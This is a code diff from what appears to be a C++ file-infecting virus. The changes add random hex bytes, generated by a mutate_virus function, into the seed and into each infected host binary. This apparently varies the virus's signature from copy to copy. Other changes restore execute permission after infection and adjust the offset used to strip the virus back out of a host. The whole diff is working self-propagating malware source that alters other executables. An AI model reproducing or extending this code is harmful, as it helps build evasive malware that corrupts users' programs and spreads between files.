@@ -23,7 +23,7 @@ int get_virus_size();
 bool is_infected(std::string infectedHost, std::string binary);
 void create_empty_seed();
 void generate_hex_string(char str[], int length);
-void mutate_virus();
+std::string mutate_virus();
 
 int main(int argc, char** argv) {
     std::string fileName;
@@ -32,7 +32,8 @@ int main(int argc, char** argv) {
     std::string temporaryLocation = "garbage";
     std::string folder = "./tem/";
     create_directory(folder);
-    mutate_virus();
+    //std::string hex = mutate_virus();
+    //cout << hex << endl;
     if(argc > 1){
       fileName = argv[1];
       copy_uninfected_binary(hostName, folder);
@@ -41,10 +42,10 @@ int main(int argc, char** argv) {
       command.insert(command.length(), " " + fileName);
       if(is_file_exist(fileName)){
         system(command.c_str());
-        //modify_execute_access(fileName, false);
         if(!is_infected(hostName, fileName)){
           make_temp_copy(hostName, fileName, folder, temporaryLocation);
           infect_file(hostName, fileName, folder, temporaryLocation);
+          modify_execute_access(fileName, true)
         }
         else{
           return 1;
@@ -64,15 +65,15 @@ int main(int argc, char** argv) {
     return 0;
 }
 
-void mutate_virus(){
-
+std::string mutate_virus(){
   int length = 20;
   char str[length];
+  std::string hex = "";
   generate_hex_string(str, length);
   for(int i = 0; i < length; i++){
-    cout << str[i];
+    hex += str[i];
   }
-  cout << endl;
+  return hex;
 }
 
 void generate_hex_string(char str[], int length)
@@ -132,6 +133,15 @@ void build_seed(std::string progName){
     std::istringstream(nextbyte) >> std::hex >> byte;
     seed << static_cast<uint8_t>(byte);
   }
+  hex = mutate_virus();
+  for (size_t i = 0; i < hex.length(); i += 2)
+  {
+    uint16_t byte;
+    std::string nextbyte = hex.substr(i, 2);
+    std::istringstream(nextbyte) >> std::hex >> byte;
+    seed << static_cast<uint8_t>(byte);
+  }
+  cout << hex << endl;
   seed << host.rdbuf();
   seed.close();
   host.close();
@@ -188,6 +198,15 @@ void infect_file(std::string infectedHost, std::string fileName, std::string fol
       std::istringstream(nextbyte) >> std::hex >> byte;
       dst << static_cast<uint8_t>(byte);
     }
+    hex = mutate_virus();
+    for (size_t i = 0; i < hex.length(); i += 2)
+    {
+      uint16_t byte;
+      std::string nextbyte = hex.substr(i, 2);
+      std::istringstream(nextbyte) >> std::hex >> byte;
+      dst << static_cast<uint8_t>(byte);
+    }
+    cout << hex << endl;
     hostSrc = temporaryLocation;
     hostSrc.insert(0, folder);
     std::ifstream src1(hostSrc, std::ios::binary);
@@ -205,7 +224,7 @@ void copy_uninfected_binary(std::string host, std::string folder){
     std::ifstream src(hostSrc, std::ios::binary);
     std::ofstream dst(hostDest, std::ios::binary);
     int virusSize = get_virus_size();
-    src.seekg(virusSize + 4);
+    src.seekg(virusSize + 14);
     dst << src.rdbuf();
     modify_execute_access(hostDest, true);
 }
